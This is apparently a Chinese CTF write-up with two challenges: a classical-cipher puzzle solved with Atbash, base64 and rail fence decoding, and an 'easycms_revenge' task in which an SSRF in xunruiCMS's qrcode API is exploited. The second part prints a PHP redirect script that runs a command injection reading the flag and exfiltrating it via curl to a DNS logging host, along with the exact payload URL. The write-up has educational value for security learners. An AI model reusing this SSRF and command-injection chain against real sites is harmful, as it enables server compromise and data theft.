古典密码：

题目：AnU7NnR4NassOGp3BDJgAGonMaJayTwrBqZ3ODMoMWxgMnFdNqtdMTM9

题目限制在古典密码解密中，一个一个解密试，用Atbash Cipher获取了一个可以接着解密的字符串ZmF7MmI4MzhhLTk3YWQtZTlmNzQzbGdiYjA3LWNlNDctNmUwMjgwNGN9,然后发现可以魔术方法base64解码，发现fa{2b838a-97ad-e9f743lgbb07-ce47-6e02804c}，发现还不是flag格式，在继续找古典密码解密，最后发现栅栏解密出了符合flag格式的字符串。

flag{b2bb0873-8cae-4977-a6de-0e298f0744c3}





easycms_revenge

主页进去发现是xunruiCMS，在github里面下载源码发现有一条源码可以进行利用，qrcode发现二维码，可以进行api利用

return ROOT_URL.'index.php?s=api&c=api&m=qrcode&uid='.urlencode($uid).'&text='.urlencode($text).'&size='.$size.'&level='.$level;

在api.php中发现thunb的这个参数进行了一定的处理，输出一个二维码

put_file_content函数的利用ssrf漏洞，用vps重定向执行命令执行，在自己的服务器上构造脚本；222.php

GIF89a
<?php
echo "GIF89a";
Header("Location: http://127.0.0.1/flag.php?cmd=curl http://`/readflag`.7i8vrf.dnslog.cn");
//Header("Location: http://baidu.com");
exit();
?>

再用浏览器访问主页的该脚本

payload：

?s=api&c=api&m=qrcode&thumb=http://120.76.142.165:35666/222.php&text=1&size=1&level=1

最后用[DNSLog Platform](http://dnslog.cn/)该网站监听网址携带的信息获取flag

| DNS Query Record                                          | IP Address   | Created Time         |
| --------------------------------------------------------- | ------------ | -------------------- |
| flaga04abcf1-ce10-4564-8963-ba2a3ea8a407.7i8vrf.dnslog.cn | 39.96.152.65 | 2024-5-19 17：07：50 |

![image-20240519173144790](https://raw.githubusercontent.com/odiws/blog-img/main/image-20240519173144790.png)